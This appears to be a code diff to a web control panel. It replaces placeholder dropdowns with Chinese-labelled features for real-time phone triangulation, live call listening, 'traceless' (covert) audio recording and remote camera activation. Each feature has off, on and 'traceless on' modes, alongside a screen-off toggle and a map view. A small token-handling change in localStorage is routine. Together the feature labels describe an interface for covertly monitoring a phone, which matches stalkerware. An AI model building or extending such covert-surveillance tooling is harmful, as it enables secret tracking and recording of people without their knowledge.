@@ -581,9 +581,9 @@
                   <div>
                     <div class="adv-label" id="adv1Label">Dropdown 1 (placeholder)</div>
                     <select class="adv-select" id="adv1">
-                      <option>Option A1</option>
-                      <option>Option A2</option>
-                      <option>Option A3</option>
+                      <option>关闭</option>
+                      <option>开启</option>
+                      <option>无痕开启</option>
                     </select>
                   </div>
                   <button class="btn" type="button" data-adv-btn="1">Open</button>
@@ -593,9 +593,9 @@
                   <div>
                     <div class="adv-label" id="adv2Label">Dropdown 2 (placeholder)</div>
                     <select class="adv-select" id="adv2">
-                      <option>Option B1</option>
-                      <option>Option B2</option>
-                      <option>Option B3</option>
+                      <option>关闭</option>
+                      <option>开启</option>
+                      <option>无痕开启</option>
                     </select>
                   </div>
                   <button class="btn" type="button" data-adv-btn="2">Open</button>
@@ -605,9 +605,9 @@
                   <div>
                     <div class="adv-label" id="adv3Label">Dropdown 3 (placeholder)</div>
                     <select class="adv-select" id="adv3">
-                      <option>Option C1</option>
-                      <option>Option C2</option>
-                      <option>Option C3</option>
+                      <option>关闭</option>
+                      <option>开启</option>
+                      <option>无痕开启</option>
                     </select>
                   </div>
                   <button class="btn" type="button" data-adv-btn="3">Open</button>
@@ -617,9 +617,9 @@
                   <div>
                     <div class="adv-label" id="adv4Label">Dropdown 4 (placeholder)</div>
                     <select class="adv-select" id="adv4">
-                      <option>Option D1</option>
-                      <option>Option D2</option>
-                      <option>Option D3</option>
+                      <option>关闭</option>
+                      <option>开启</option>
+                      <option>无痕开启</option>
                     </select>
                   </div>
                   <button class="btn" type="button" data-adv-btn="4">Open</button>
@@ -720,10 +720,10 @@
         f_screen_off: "Screen Off",
         state_on: "ON",
         state_off: "OFF",
-        adv1: "Dropdown 1 (placeholder)",
-        adv2: "Dropdown 2 (placeholder)",
-        adv3: "Dropdown 3 (placeholder)",
-        adv4: "Dropdown 4 (placeholder)",
+        adv1: "Dropdown 1 ",
+        adv2: "Dropdown ",
+        adv3: "Dropdown ",
+        adv4: "Dropdown ",
         advTip: "Below is the map display box. The button on the right toggles Google / AMap.",
         toggle: "Toggle",
         mapGoogle: "Google Map",
@@ -773,11 +773,11 @@
         f_screen_off: "手机息屏",
         state_on: "开启",
         state_off: "关闭",
-        adv1: "下拉框1（占位）",
-        adv2: "下拉框2（占位）",
-        adv3: "下拉框3（占位）",
-        adv4: "下拉框4（占位）",
-        advTip: "下方是地图显示框，右侧中间按钮可切换 Google / 高德（当前用嵌入占位）。",
+        adv1: "实时三角定位",
+        adv2: "实时通话",
+        adv3: "无痕录音",
+        adv4: "打开摄像头",
+        advTip: "右侧中间按钮可切换 Google / 高德地图。",
         toggle: "切换",
         mapGoogle: "Google 地图",
         mapAmap: "高德地图",
@@ -873,9 +873,20 @@
 
     // ===== 4) API Base / Token =====
     const API_BASE = (localStorage.getItem("api_base") || "").trim();
+
     function getAuthToken(){
-      const v = (localStorage.getItem("token") || "").trim();
-      return v;
+      // ✅ 先读新口径 token
+      let v = (localStorage.getItem("token") || "").trim();
+      if (v) return v;
+
+      // ✅ 兼容旧口径 session_token（login.html 之前写的是它）
+      v = (localStorage.getItem("session_token") || "").trim();
+      if (v) {
+        // 回填 token，确保后续统一
+        localStorage.setItem("token", v);
+        return v;
+      }
+      return "";
     }
     function withBearer(tok){
       if(!tok) return "";
